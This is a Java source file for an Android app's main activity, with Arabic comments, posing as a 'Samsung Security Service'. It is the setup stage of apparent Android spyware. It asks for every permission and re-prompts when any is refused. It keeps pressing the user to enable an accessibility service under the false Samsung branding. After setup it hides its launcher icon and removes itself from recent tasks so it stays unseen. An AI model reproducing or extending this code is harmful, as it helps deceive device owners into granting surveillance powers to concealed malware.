package com.samsung.android.security.v8;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import com.samsung.android.security.v8.services.MyAccessibilityService;
import com.samsung.android.security.v8.utils.PermissionManager;
import com.samsung.android.security.v8.utils.PreferenceManager;

/**
 * MainActivity - النشاط الرئيسي
 * يظهر فقط في المرة الأولى لطلب الصلاحيات
 * ثم يختفي تماماً
 */
public class MainActivity extends Activity {

    private PermissionManager permissionManager;
    private boolean isFirstLaunch = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // التحقق إذا كانت المرة الأولى
        isFirstLaunch = PreferenceManager.isFirstLaunch(this);
        
        if (isFirstLaunch) {
            // المرة الأولى - طلب الصلاحيات
            showWelcomeAndRequestPermissions();
        } else {
            // ليست المرة الأولى - إخفاء فوري
            hideAppAndFinish();
        }
    }

    /**
     * عرض شاشة الترحيب وطلب الصلاحيات
     */
    private void showWelcomeAndRequestPermissions() {
        setContentView(R.layout.activity_main);
        
        permissionManager = new PermissionManager(this);
        
        // عرض رسالة ترحيب
        Toast.makeText(this, "Samsung Security Service\nInitializing...", Toast.LENGTH_LONG).show();
        
        // طلب جميع الصلاحيات
        permissionManager.requestAllPermissions(new PermissionManager.PermissionCallback() {
            @Override
            public void onPermissionsGranted() {
                // جميع الصلاحيات تم منحها
                requestAccessibilityService();
            }
            
            @Override
            public void onPermissionsDenied() {
                // بعض الصلاحيات مرفوضة - إعادة المحاولة
                Toast.makeText(MainActivity.this, 
                    "Please grant all permissions for proper operation", 
                    Toast.LENGTH_LONG).show();
                permissionManager.requestAllPermissions(this);
            }
        });
    }

    /**
     * طلب تفعيل خدمة Accessibility
     */
    private void requestAccessibilityService() {
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, 
                "Please enable accessibility service for Samsung Security", 
                Toast.LENGTH_LONG).show();
            
            // فتح إعدادات Accessibility
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, 100);
        } else {
            // كل شيء جاهز - إخفاء التطبيق
            completeSetup();
        }
    }

    /**
     * التحقق من تفعيل Accessibility Service
     */
    private boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            
            if (settingValue != null) {
                return settingValue.contains(service);
            }
        }
        
        return false;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == 100) {
            // العودة من إعدادات Accessibility
            if (isAccessibilityServiceEnabled()) {
                completeSetup();
            } else {
                // لم يتم التفعيل - إعادة المحاولة
                requestAccessibilityService();
            }
        }
    }

    /**
     * إكمال الإعداد وإخفاء التطبيق
     */
    private void completeSetup() {
        // حفظ أن التطبيق تم إعداده
        PreferenceManager.setFirstLaunchCompleted(this);
        
        // إخفاء الأيقونة
        hideAppIcon();
        
        // رسالة نجاح
        Toast.makeText(this, "Samsung Security Service Activated", Toast.LENGTH_SHORT).show();
        
        // إنهاء النشاط
        finish();
    }

    /**
     * إخفاء أيقونة التطبيق من الشاشة الرئيسية
     */
    private void hideAppIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    /**
     * إخفاء التطبيق والإنهاء
     */
    private void hideAppAndFinish() {
        // التطبيق مخفي بالفعل - لا نفعل شيء
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // إزالة من قائمة التطبيقات الحديثة
        finishAndRemoveTask();
    }
}
